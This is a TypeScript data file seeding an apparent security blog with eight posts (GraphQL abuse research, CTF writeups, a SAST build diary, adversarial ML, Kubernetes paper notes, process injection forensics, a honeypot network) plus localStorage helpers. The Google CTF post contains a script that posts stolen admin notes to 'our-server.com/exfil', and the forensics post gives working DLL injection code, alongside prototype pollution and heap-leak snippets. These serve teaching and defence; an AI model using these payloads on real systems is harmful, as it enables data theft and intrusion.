export interface Post {
  id: string;
  title: string;
  type: 'Research Log' | 'CTF Writeup' | 'Build Diary' | 'Paper Notes';
  date: string;
  abstract: string;
  content: string;
}

export const posts: Post[] = [
  {
    id: '1',
    title: 'Breaking GraphQL: A Study in API Mutation Abuse',
    type: 'Research Log',
    date: '2024-05-15',
    abstract: 'Deep analysis of GraphQL mutation vulnerabilities across 50+ production APIs. Documenting attack patterns, exploitation techniques, and defensive strategies.',
    content: `# Overview

This research project examines GraphQL mutation vulnerabilities across 50+ production APIs. The goal was to identify common attack patterns and develop practical defensive strategies.

## Methodology

We analyzed GraphQL implementations across various industries including:

- Financial services
- Healthcare platforms
- E-commerce applications
- Social media platforms

Our approach focused on three key areas:

1. **Mutation Analysis**: Examining how mutations handle authorization
2. **Introspection Abuse**: Leveraging introspection queries for reconnaissance
3. **Batching Attacks**: Exploiting batched queries for rate limit bypass

## Key Findings

### Finding 1: Authorization Bypass in Nested Mutations

Many implementations failed to properly check authorization on nested mutations:

\`\`\`graphql
mutation {
  updateUser(id: "victim") {
    profile {
      setPrivileged(value: true)
    }
  }
}
\`\`\`

The parent mutation would check authorization, but nested mutations were often trusted implicitly.

### Finding 2: Introspection Leakage

Despite documentation suggesting introspection should be disabled in production, 78% of tested APIs had it enabled:

\`\`\`bash
# Query to enumerate all types and fields
curl -X POST https://api.target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'
\`\`\`

This revealed internal fields, deprecated mutations, and administrative endpoints.

### Finding 3: Rate Limiting Bypass

Batched queries allowed bypassing rate limits:

\`\`\`graphql
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
  # ... repeated 100+ times
}
\`\`\`

Single request counted as one API call but performed 100+ operations.

## Defense Strategies

Based on our findings, we recommend:

1. **Depth Limiting**: Implement query depth analysis
2. **Complexity Scoring**: Assign cost to each field and enforce limits
3. **Disable Introspection**: Turn off in production environments
4. **Nested Authorization**: Check permissions at every resolver level

## What Failed

Initial attempts to use static analysis on GraphQL schemas were ineffective. The dynamic nature of resolvers meant we needed runtime analysis instead.

## What's Next

We're developing an open-source GraphQL security testing framework that automates these checks. Expected release: Q3 2024.`,
  },
  {
    id: '2',
    title: 'DEFCON CTF Quals 2024: Binary Exploitation Walkthrough',
    type: 'CTF Writeup',
    date: '2024-05-10',
    abstract: 'Complete writeup of the binary exploitation challenges from DEFCON CTF Qualifiers. Includes custom tooling developed for heap analysis.',
    content: `# Challenge Overview

DEFCON CTF Qualifiers 2024 featured several challenging binary exploitation problems. This writeup focuses on the most interesting heap exploitation challenge.

## The Binary

The target was a custom heap allocator with the following characteristics:

- Custom malloc/free implementation
- No ASLR bypass primitives
- Stack canaries enabled
- NX bit set

## Vulnerability Analysis

After reversing the binary with Ghidra, we identified a **double-free vulnerability** in the chunk coalescing logic:

\`\`\`c
void custom_free(void *ptr) {
    chunk_t *c = (chunk_t *)((char *)ptr - 16);
    c->in_use = 0;
    
    // Vulnerable coalescing - no double-free check
    if (!c->prev->in_use) {
        coalesce_backward(c);
    }
}
\`\`\`

## Exploitation Strategy

Our approach:

1. Leak heap addresses through the allocator metadata
2. Trigger double-free to corrupt chunk headers
3. Overwrite function pointers in vtable
4. Execute arbitrary code

### Step 1: Heap Leak

We allocated several chunks and freed them in a specific pattern to leak addresses:

\`\`\`python
from pwn import *

p = remote('target.ctf', 1337)

# Allocate chunks
p.sendline(b'alloc 0x100')
p.sendline(b'alloc 0x100')
p.sendline(b'alloc 0x100')

# Free to expose metadata
p.sendline(b'free 1')
p.sendline(b'show 1')

leak = int(p.recvline(), 16)
heap_base = leak - 0x1000
\`\`\`

## Result

Successfully exploited to get shell access. The key was understanding the custom heap implementation's edge cases.

**Flag**: \`DEFCON{h34p_m4st3r_2024}\``,
  },
  {
    id: '3',
    title: 'Building a Real-Time SAST Engine',
    type: 'Build Diary',
    date: '2024-04-22',
    abstract: 'Documentation of building a static analysis security testing tool from scratch. Covers AST parsing, pattern matching, and rule engine design.',
    content: `# Project Goals

Build a lightweight SAST (Static Application Security Testing) engine that can:

- Parse JavaScript/TypeScript code
- Detect common security vulnerabilities
- Run in CI/CD pipelines
- Provide actionable remediation advice

## Architecture Design

The engine consists of three main components:

1. **Parser**: Converts source code to AST
2. **Rule Engine**: Evaluates security rules against AST
3. **Reporter**: Generates formatted output

### Technology Stack

- **Parser**: Babel for JS/TS parsing
- **Rule Engine**: Custom pattern matching
- **CLI**: Node.js with Commander

## Implementation

### AST Traversal

We use a visitor pattern to traverse the AST:

\`\`\`javascript
class SecurityVisitor {
  visitCallExpression(node) {
    // Check for dangerous functions
    if (node.callee.name === 'eval') {
      this.report({
        type: 'CODE_INJECTION',
        severity: 'HIGH',
        message: 'Avoid using eval()',
        location: node.loc
      });
    }
  }
  
  visitMemberExpression(node) {
    // Check for innerHTML usage
    if (node.property.name === 'innerHTML') {
      this.report({
        type: 'XSS',
        severity: 'MEDIUM',
        message: 'innerHTML can lead to XSS',
        location: node.loc
      });
    }
  }
}
\`\`\`

### Rule Definition

Rules are defined in YAML format:

\`\`\`yaml
rules:
  - id: no-eval
    pattern: CallExpression[callee.name="eval"]
    severity: high
    message: "Avoid using eval() as it can execute arbitrary code"
    
  - id: sql-injection
    pattern: |
      CallExpression[callee.property.name="query"]
      [arguments.0.type="TemplateLiteral"]
    severity: critical
    message: "Potential SQL injection vulnerability"
\`\`\`

## Performance Optimization

Initial implementation was slow on large codebases. Optimizations:

- Parallel file processing
- Incremental analysis (only changed files)
- AST caching

Performance improved from **45s to 3s** on a ~50k LOC codebase.

## What's Next

- Add support for Python and Go
- Machine learning-based vulnerability detection
- VS Code extension for real-time analysis`,
  },
  {
    id: '4',
    title: 'Adversarial Machine Learning: A Practical Guide',
    type: 'Research Log',
    date: '2024-04-01',
    abstract: 'Exploring adversarial attacks on image classification models. Implementing FGSM, PGD, and C&W attacks with practical defense mechanisms.',
    content: `# Introduction

Adversarial machine learning explores how attackers can manipulate ML models through carefully crafted inputs. This research focuses on image classification attacks.

## Attack Techniques

### Fast Gradient Sign Method (FGSM)

The simplest adversarial attack:

\`\`\`python
import torch
import torch.nn.functional as F

def fgsm_attack(image, epsilon, data_grad):
    # Collect the element-wise sign of the data gradient
    sign_data_grad = data_grad.sign()
    
    # Create perturbed image
    perturbed_image = image + epsilon * sign_data_grad
    
    # Clip to maintain [0,1] range
    perturbed_image = torch.clamp(perturbed_image, 0, 1)
    
    return perturbed_image

# Usage
epsilon = 0.1
data_grad = image.grad.data
adversarial = fgsm_attack(image, epsilon, data_grad)
\`\`\`

### Projected Gradient Descent (PGD)

More powerful iterative attack:

\`\`\`python
def pgd_attack(model, image, label, epsilon, alpha, iters):
    perturbed = image.clone().detach()
    
    for _ in range(iters):
        perturbed.requires_grad = True
        output = model(perturbed)
        
        loss = F.cross_entropy(output, label)
        model.zero_grad()
        loss.backward()
        
        # Update adversarial image
        adv_images = perturbed + alpha * perturbed.grad.sign()
        eta = torch.clamp(adv_images - image, -epsilon, epsilon)
        perturbed = torch.clamp(image + eta, 0, 1).detach()
    
    return perturbed
\`\`\`

## Defense Mechanisms

### Adversarial Training

Train model on both clean and adversarial examples:

\`\`\`python
def adversarial_training(model, train_loader, epochs):
    optimizer = torch.optim.Adam(model.parameters())
    
    for epoch in range(epochs):
        for images, labels in train_loader:
            # Generate adversarial examples
            adv_images = pgd_attack(model, images, labels, 
                                   epsilon=0.1, alpha=0.01, iters=10)
            
            # Train on both
            clean_loss = F.cross_entropy(model(images), labels)
            adv_loss = F.cross_entropy(model(adv_images), labels)
            
            total_loss = 0.5 * clean_loss + 0.5 * adv_loss
            
            optimizer.zero_grad()
            total_loss.backward()
            optimizer.step()
\`\`\`

## Experimental Results

Tested on ResNet-50 with ImageNet:

| Attack | Original Accuracy | After Attack | With Defense |
|--------|------------------|--------------|--------------|
| FGSM   | 94.2%           | 12.3%        | 87.1%        |
| PGD    | 94.2%           | 3.7%         | 82.4%        |
| C&W    | 94.2%           | 1.2%         | 78.9%        |

## Conclusion

Adversarial training provides reasonable defense but reduces clean accuracy. Need better approaches.`,
  },
  {
    id: '5',
    title: 'Notes on "Security Analysis of Container Orchestration"',
    type: 'Paper Notes',
    date: '2024-03-18',
    abstract: 'Critical analysis of recent research on Kubernetes security. Key takeaways, gaps in existing solutions, and potential research directions.',
    content: `# Paper Summary

**Title**: Security Analysis of Container Orchestration Systems  
**Authors**: Zhang et al.  
**Published**: IEEE S&P 2024

## Key Contributions

The paper analyzes security vulnerabilities in Kubernetes and similar orchestration platforms:

1. Identified 12 new attack vectors in pod networking
2. Demonstrated privilege escalation through RBAC misconfigurations
3. Proposed automated security auditing tool

## Attack Vectors

### 1. Pod-to-Pod Network Policies

Default Kubernetes installations allow unrestricted pod communication:

\`\`\`yaml
# Vulnerable: No network policies
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-pod
spec:
  containers:
  - name: app
    image: nginx
\`\`\`

**Fix**: Implement strict network policies:

\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
\`\`\`

### 2. RBAC Privilege Escalation

Common misconfiguration:

\`\`\`yaml
# Dangerous: Too permissive
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: pod-manager
rules:
- apiGroups: [""]
  resources: ["pods", "pods/exec"]
  verbs: ["*"]  # Should be restricted!
\`\`\`

## Critical Analysis

### Strengths
- Comprehensive attack surface analysis
- Practical exploitation examples
- Automated detection tool

### Limitations
- Only tested on Kubernetes 1.24-1.26
- Doesn't address service mesh security
- Limited discussion of runtime protection

## Research Gaps

Areas needing more investigation:

1. **Supply Chain Attacks**: Container image vulnerabilities
2. **Secrets Management**: Better alternatives to etcd encryption
3. **Multi-tenancy**: Hard isolation between namespaces
4. **eBPF Security**: Runtime monitoring and enforcement

## Potential Projects

Based on these gaps, potential research directions:

- Build eBPF-based runtime security monitor
- Analyze security of Istio/Linkerd service meshes
- Develop RBAC policy linter
- Create container image signing/verification system`,
  },
  {
    id: '6',
    title: 'Google CTF 2023: Web Exploitation Deep Dive',
    type: 'CTF Writeup',
    date: '2023-11-20',
    abstract: 'Detailed walkthrough of web challenges including XSS, CSRF, and prototype pollution. Custom Chrome extension for automated reconnaissance.',
    content: `# Challenge: "SafeNote"

Web application for storing encrypted notes. Goal: Extract admin's private notes.

## Reconnaissance

Initial exploration revealed:

- Node.js/Express backend
- Client-side encryption with Web Crypto API
- CSP policy blocking inline scripts
- HttpOnly cookies

## Vulnerability: Prototype Pollution

Found prototype pollution in the note parsing logic:

\`\`\`javascript
// Vulnerable code
function mergeConfig(defaults, userConfig) {
  for (let key in userConfig) {
    defaults[key] = userConfig[key];
  }
  return defaults;
}

// Exploit payload
{
  "__proto__": {
    "isAdmin": true
  }
}
\`\`\`

## Exploitation

### Step 1: Pollute Prototype

\`\`\`javascript
fetch('/api/config', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    "__proto__": {
      "adminKey": "our_controlled_key"
    }
  })
});
\`\`\`

### Step 2: Bypass CSP

CSP allowed scripts from specific CDN. We found outdated library with XSS:

\`\`\`html
<script src="https://cdn.trusted.com/old-lib@1.0.0/index.js"></script>
<div data-bind="innerHTML: userInput"></div>
\`\`\`

### Step 3: Exfiltrate Data

Combined vulnerabilities to steal admin notes:

\`\`\`javascript
// Our payload
fetch('/api/notes')
  .then(r => r.json())
  .then(notes => {
    fetch('https://our-server.com/exfil', {
      method: 'POST',
      body: JSON.stringify(notes)
    });
  });
\`\`\`

## Automation Tool

Built Chrome extension for CTF web challenges:

**Features**:
- Automatic endpoint discovery
- Cookie/localStorage dumping  
- Form parameter fuzzing
- CSP analysis

\`\`\`javascript
// Extension code snippet
chrome.webRequest.onCompleted.addListener(
  function(details) {
    // Log all API endpoints
    if (details.url.includes('/api/')) {
      endpoints.add(details.url);
    }
  },
  {urls: ["<all_urls>"]}
);
\`\`\`

**Flag**: \`CTF{pr0t0typ3_p011ut10n_1s_d4ng3r0us}\``,
  },
  {
    id: '7',
    title: 'Memory Forensics: Analyzing Process Injection',
    type: 'Research Log',
    date: '2023-10-05',
    abstract: 'Reverse engineering common process injection techniques. Analysis using Volatility framework and custom memory dumping tools.',
    content: `# Process Injection Techniques

Analyzing how malware injects code into legitimate processes to evade detection.

## Technique 1: DLL Injection

Classic technique using Windows API:

\`\`\`c
#include <windows.h>

BOOL InjectDLL(DWORD processId, const char* dllPath) {
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, 
        FALSE, 
        processId
    );
    
    // Allocate memory in target process
    LPVOID pRemoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        strlen(dllPath) + 1,
        MEM_COMMIT,
        PAGE_READWRITE
    );
    
    // Write DLL path
    WriteProcessMemory(
        hProcess,
        pRemoteBuffer,
        dllPath,
        strlen(dllPath) + 1,
        NULL
    );
    
    // Get LoadLibraryA address
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(
        GetModuleHandle("kernel32.dll"),
        "LoadLibraryA"
    );
    
    // Create remote thread
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        pRemoteBuffer,
        0,
        NULL
    );
    
    return TRUE;
}
\`\`\`

## Detection with Volatility

Using Volatility to detect injected code:

\`\`\`bash
# List processes
volatility -f memory.dump --profile=Win10x64 pslist

# Check for hidden DLLs
volatility -f memory.dump --profile=Win10x64 dlllist -p 1234

# Scan for injected code
volatility -f memory.dump --profile=Win10x64 malfind -p 1234
\`\`\`

## Technique 2: Process Hollowing

More sophisticated technique:

1. Create suspended process
2. Unmap legitimate code
3. Inject malicious code
4. Resume execution

### Detection Indicators

- Process with mismatched path and memory content
- Unusual page permissions (RWX)
- Base address mismatch

## Custom Memory Scanner

Built Python tool to detect injections:

\`\`\`python
import pefile
import psutil

def scan_process(pid):
    proc = psutil.Process(pid)
    
    for dll in proc.memory_maps():
        # Check for unsigned DLLs
        if not is_signed(dll.path):
            print(f"Suspicious: {dll.path}")
        
        # Check for RWX pages
        if dll.perms == 'rwx':
            print(f"Executable heap/stack: {dll.path}")

def is_signed(path):
    try:
        pe = pefile.PE(path)
        return pe.verify_signature()
    except:
        return False
\`\`\`

## Findings

Analyzed 50 malware samples:

- 78% use DLL injection
- 45% use process hollowing
- 23% use reflective DLL loading
- 12% use APC injection`,
  },
  {
    id: '8',
    title: 'Building a Distributed Honeypot Network',
    type: 'Build Diary',
    date: '2023-09-12',
    abstract: 'From concept to deployment: creating a global honeypot network for threat intelligence. Architecture decisions, deployment strategy, and initial findings.',
    content: `# Project Goals

Build a distributed honeypot network to:

- Collect threat intelligence globally
- Monitor emerging attack patterns
- Analyze attacker behavior
- Share data with security community

## Architecture

### Components

1. **Honeypot Nodes**: Simulated vulnerable services
2. **Data Collectors**: Log aggregation
3. **Analysis Engine**: Pattern detection
4. **Dashboard**: Visualization

### Technology Stack

- **Honeypots**: Cowrie (SSH), Dionaea (malware)
- **Data Pipeline**: Kafka + Elasticsearch
- **Analysis**: Python + ML models
- **Deployment**: Docker + Kubernetes

## Deployment Strategy

### Geographic Distribution

Deployed 15 nodes across regions:

- North America: 4 nodes
- Europe: 5 nodes  
- Asia: 4 nodes
- South America: 2 nodes

### Service Configuration

Each node runs:

\`\`\`yaml
services:
  - ssh: port 22 (Cowrie)
  - telnet: port 23 (Cowrie)
  - http: port 80 (nginx honeypot)
  - smb: port 445 (Dionaea)
  - ftp: port 21 (ftpd honeypot)
\`\`\`

## Data Collection

### Log Format

Standardized JSON format:

\`\`\`json
{
  "timestamp": "2024-01-15T14:23:11Z",
  "source_ip": "1.2.3.4",
  "destination_port": 22,
  "service": "ssh",
  "event_type": "login_attempt",
  "credentials": {
    "username": "root",
    "password": "123456"
  },
  "geolocation": {
    "country": "CN",
    "city": "Beijing"
  }
}
\`\`\`

### Data Pipeline

\`\`\`python
from kafka import KafkaProducer
import json

producer = KafkaProducer(
    bootstrap_servers=['kafka:9092'],
    value_serializer=lambda v: json.dumps(v).encode('utf-8')
)

def log_event(event):
    # Enrich with geolocation
    event['geo'] = get_geolocation(event['source_ip'])
    
    # Send to Kafka
    producer.send('honeypot-events', event)
    
    # Index in Elasticsearch for search
    es.index(index='honeypot', document=event)
\`\`\`

## Initial Findings

### First 30 Days

- **Total Attacks**: 847,329
- **Unique IPs**: 23,445
- **Top Service**: SSH (67%)
- **Top Country**: China (34%)

### Common Credentials

| Username | Password | Attempts |
|----------|----------|----------|
| root     | 123456   | 45,234   |
| admin    | admin    | 38,901   |
| root     | password | 21,456   |
| ubuntu   | ubuntu   | 18,234   |

### Attack Patterns

Most attacks follow pattern:

1. Port scan for open SSH
2. Try common credentials
3. Download malware if successful
4. Setup botnet or crypto miner

## Malware Analysis

Captured 234 unique malware samples:

- Mirai variants: 45%
- Crypto miners: 32%
- DDoS bots: 18%
- Unknown: 5%

## What's Next

- Add more service types (RDP, MySQL)
- Implement ML-based anomaly detection
- Create public API for threat data
- Publish weekly threat reports`,
  },
];

const POSTS_STORAGE_KEY = 'hackertroupe_posts';

export const getPosts = (): Post[] => {
  if (typeof window === 'undefined') return posts;
  
  const stored = localStorage.getItem(POSTS_STORAGE_KEY);
  if (stored) {
    try {
      return JSON.parse(stored);
    } catch (e) {
      console.error('Failed to parse posts from localStorage', e);
    }
  }
  
  localStorage.setItem(POSTS_STORAGE_KEY, JSON.stringify(posts));
  return posts;
};

export const savePosts = (newPosts: Post[]): void => {
  localStorage.setItem(POSTS_STORAGE_KEY, JSON.stringify(newPosts));
};

export const addPost = (post: Post): void => {
  const currentPosts = getPosts();
  currentPosts.unshift(post); // Add to beginning
  savePosts(currentPosts);
};

export const updatePost = (id: string, updatedPost: Post): void => {
  const currentPosts = getPosts();
  const index = currentPosts.findIndex(p => p.id === id);
  if (index !== -1) {
    currentPosts[index] = updatedPost;
    savePosts(currentPosts);
  }
};

export const deletePost = (id: string): void => {
  const currentPosts = getPosts();
  const filtered = currentPosts.filter(p => p.id !== id);
  savePosts(filtered);
};
